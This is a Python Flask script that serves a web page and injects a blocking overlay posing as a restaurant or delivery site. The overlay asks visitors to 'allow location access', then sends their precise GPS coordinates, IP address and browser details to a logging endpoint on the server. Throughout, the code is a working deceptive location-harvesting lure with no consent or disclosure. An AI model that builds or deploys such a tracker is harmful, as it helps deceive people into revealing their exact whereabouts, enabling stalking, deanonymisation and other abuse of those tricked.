from flask import Flask, request, send_from_directory
import logging
import os
from datetime import datetime

app = Flask(__name__)

# Enhanced logging configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.route('/')
def serve_page():
    # Get client details
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.now().isoformat()
    
    # Initial access log
    logger.info(f"PAGE_ACCESS - IP: {client_ip} - User Agent: {user_agent} - Time: {timestamp}")
    
    # Read your existing page.html
    try:
        with open('page.html', 'r') as f:
            html_content = f.read()
    except FileNotFoundError:
        html_content = "<html><body>Default page - page.html not found</body></html>"
    
    # Inject the working permission overlay and tracking
    overlay_and_script = f"""
    <style>
        #locationOverlay {{
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 99999;
            color: white;
            text-align: center;
            padding: 20px;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
        }}
        #locationButton {{
            background: #FF3008;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 25px;
            margin-top: 25px;
            cursor: pointer;
            font-weight: bold;
        }}
    </style>

    <div id="locationOverlay">
        <h2>Enable Location Services</h2>
        <p>We need your location to show nearby restaurants</p>
        <button id="locationButton">ALLOW LOCATION ACCESS</button>
    </div>

    <script>
        // Enhanced location tracking with debugging
        function logToServer(type, data) {{
            const timestamp = new Date().toISOString();
            const payload = {{
                type: type,
                data: data,
                timestamp: timestamp,
                userAgent: navigator.userAgent
            }};
            
            // Send using Beacon API for reliability
            navigator.sendBeacon('/log_data', JSON.stringify(payload));
        }}

        document.getElementById('locationButton').addEventListener('click', function() {{
            logToServer('button_click', {{}});
            
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(
                    function(position) {{
                        // Success callback
                        const locationData = {{
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        }};
                        logToServer('location_success', locationData);
                        document.getElementById('locationOverlay').style.display = 'none';
                    }},
                    function(error) {{
                        // Error callback
                        const errorData = {{
                            code: error.code,
                            message: error.message
                        }};
                        logToServer('location_error', errorData);
                        
                        if(error.code === error.PERMISSION_DENIED) {{
                            document.getElementById('locationOverlay').innerHTML = `
                                <h2>Permission Denied</h2>
                                <p>Please enable location in Settings > Safari > Location Services</p>
                            `;
                        }}
                    }},
                    {{
                        enableHighAccuracy: true,
                        maximumAge: 0,
                        timeout: 15000
                    }}
                );
            }} else {{
                logToServer('unsupported', {{}});
                document.getElementById('locationOverlay').innerHTML = `
                    <h2>Not Supported</h2>
                    <p>Your browser doesn't support location services</p>
                `;
            }}
        }});
    </script>
    """
    
    # Insert before </body> or add if doesn't exist
    if '</body>' in html_content:
        modified_html = html_content.replace('</body>', overlay_and_script + '</body>')
    else:
        modified_html = html_content + overlay_and_script
    
    return modified_html

@app.route('/log_data', methods=['POST'])
def log_data():
    try:
        data = request.get_json()
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        # Enhanced logging with all details
        log_entry = {
            'ip': client_ip,
            'type': data.get('type'),
            'data': data.get('data'),
            'timestamp': data.get('timestamp'),
            'user_agent': data.get('userAgent')
        }
        
        logger.info(f"DATA_LOG: {log_entry}")
        return '', 200
        
    except Exception as e:
        logger.error(f"LOG_ERROR: {str(e)}")
        return '', 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
